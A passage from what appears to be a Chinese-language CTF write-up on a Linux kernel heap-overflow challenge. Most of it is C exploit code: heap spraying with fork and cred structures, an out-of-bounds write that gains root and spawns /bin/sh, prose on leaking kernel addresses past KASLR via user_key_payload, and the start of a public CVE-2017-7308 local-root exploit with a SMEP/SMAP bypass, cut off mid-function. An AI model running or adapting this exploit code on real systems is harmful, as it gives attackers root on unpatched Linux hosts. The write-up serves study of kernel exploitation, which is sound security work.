args);</span><br><span class="line">	va_end(args);</span><br><span class="line">	buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup_sandbox</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> real_uid = getuid();</span><br><span class="line">	<span class="type">int</span> real_gid = getgid();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWUSER) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (unshare(CLONE_NEWNET) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/set_groups)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_uid))&#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/uid_map)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!write_file(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 %d 1\\n&quot;</span>, real_gid)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] write_file(/proc/self/gid_map)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">       	<span class="type">cpu_set_t</span> my_set;</span><br><span class="line">	CPU_ZERO(&amp;my_set);</span><br><span class="line">	CPU_SET(<span class="number">0</span>, &amp;my_set);</span><br><span class="line">	<span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(my_set), &amp;my_set) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] sched_setaffinity()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (system(<span class="string">&quot;/sbin/ifconfig lo up&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;[-] system(/sbin/ifconfig lo up)&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_root</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">// We can&#x27;t simple check uid, since we&#x27;re running inside a namespace</span></span><br><span class="line">	<span class="comment">// with uid set to 0. Try opening /etc/shadow instead.</span></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/root/flag&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_fork</span><span class="params">(<span class="type">int</span> num)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">	<span class="type">pid_t</span> pid;</span><br><span class="line">	pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">	    perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">	    prctl(PR_SET_PDEATHSIG, SIGKILL);</span><br><span class="line">	    sleep(<span class="number">1000</span>);</span><br><span class="line">	    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">	        <span class="keyword">if</span>( is_root() )&#123;</span><br><span class="line">		    sleep(<span class="number">5</span>);</span><br><span class="line">	            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">               &#125;</span><br><span class="line">	   &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer,<span class="number">0</span>, <span class="number">0x110</span>);</span><br><span class="line">    <span class="type">int</span> s = oob_setup(<span class="number">0x4780</span><span class="number">-0x8</span>);</span><br><span class="line">    spray_fork(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        oob_write(buffer, <span class="number">48</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(is_root())&#123;</span><br><span class="line">	    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] starting\\n&quot;</span>);</span><br><span class="line">    setup_sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] namespace sandbox set up\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[.] padding heap\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    spray_fork(<span class="number">0x150</span>);</span><br><span class="line">    pagealloc_pad(PAGEALLOC_PAD);</span><br><span class="line"></span><br><span class="line">    spray_cred();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="开启KALSR"><a href="#开启KALSR" class="headerlink" title="开启KALSR"></a>开启KALSR</h3><p>出题人想要考察的就是kaslr状态下面的信息泄漏，只不过失误了。这里就需要一些特殊的结构体进行信息的泄漏了。我们看一下exp中给出的方法。</p>
<p>exp中使用了user_key_payload这个结构体来进行内存的泄漏。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU destructor */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>	datalen;	<span class="comment">/* length of this data */</span></span><br><span class="line">	<span class="type">char</span>		data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是如果我们利用未开启kaslr中的堆喷射和堆溢出覆写datalen为一个很大的长度，那么在进行数据读取的时候就会泄漏出当前结构体之后的一些内容，在这些内容中也可能存在一些内核的地址。当然我们也可以在这个结构体之后分配一个包含有内核信息的结构体，做到如果有泄漏就一定有内核地址的程度。</p>
<p>但是由于user_key_payload这个结构体分配的时候是从kmalloc_256这个slab中分配的占用的是一个页面，因此有时候会发生ring_buffer之后的一个页面被其他slab申请的情况，也就是ring_buffer和kmalloc_256这个slab的freelist指向的页面不相邻，也就是会有写入失败的情况发生。不知道是怎么回事我在调试的时候一次都没有成功过，但是直接执行的话倒是可以成功。</p>
<p>泄漏的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A proof-of-concept local root exploit for CVE-2017-7308.</span></span><br><span class="line"><span class="comment">// Includes a SMEP &amp; SMAP bypass.</span></span><br><span class="line"><span class="comment">// Tested on 4.8.0-41-generic Ubuntu kernel.</span></span><br><span class="line"><span class="comment">// &lt;https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ uname -a</span></span><br><span class="line"><span class="comment">// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ gcc pwn.c -o pwn</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ ./pwn</span></span><br><span class="line"><span class="comment">// [.] starting</span></span><br><span class="line"><span class="comment">// [.] namespace sandbox set up</span></span><br><span class="line"><span class="comment">// [.] KASLR bypass enabled, getting kernel addr</span></span><br><span class="line"><span class="comment">// [.] done, kernel text:   ffffffff87000000</span></span><br><span class="line"><span class="comment">// [.] commit_creds:        ffffffff870a5cf0</span></span><br><span class="line"><span class="comment">// [.] prepare_kernel_cred: ffffffff870a60e0</span></span><br><span class="line"><span class="comment">// [.] native_write_cr4:    ffffffff87064210</span></span><br><span class="line"><span class="comment">// [.] padding heap</span></span><br><span class="line"><span class="comment">// [.] done, heap is padded</span></span><br><span class="line"><span class="comment">// [.] SMEP &amp; SMAP bypass enabled, turning them off</span></span><br><span class="line"><span class="comment">// [.] done, SMEP &amp; SMAP should be off now</span></span><br><span class="line"><span class="comment">// [.] executing get root payload 0x401516</span></span><br><span class="line"><span class="comment">// [.] done, should be root now</span></span><br><span class="line"><span class="comment">// [.] checking if we got root</span></span><br><span class="line"><span class="comment">// [+] got r00t ^_^</span></span><br><span class="line"><span class="comment">// root@ubuntu:/home/user# cat /etc/shadow</span></span><br><span class="line"><span class="comment">// root:!:17246:0:99999:7:::</span></span><br><span class="line"><span class="comment">// daemon:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// bin:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Andrey Konovalov &lt;andreyknvl@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/klog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/xfrm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGESIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DumpHex</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="type">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, ((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp; ((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>) &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="type">unsigned</span> <span class="type">char</span>*)data)[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i+<span class="number">1</span> == size) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;|  %s \\n&quot;</span>, ascii);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i+<span class="number">1</span> == size) &#123;</span><br><span class="line">                ascii[(i+<span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i+<span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i+<span class="number">1</span>) % <span class="number">16</span>; 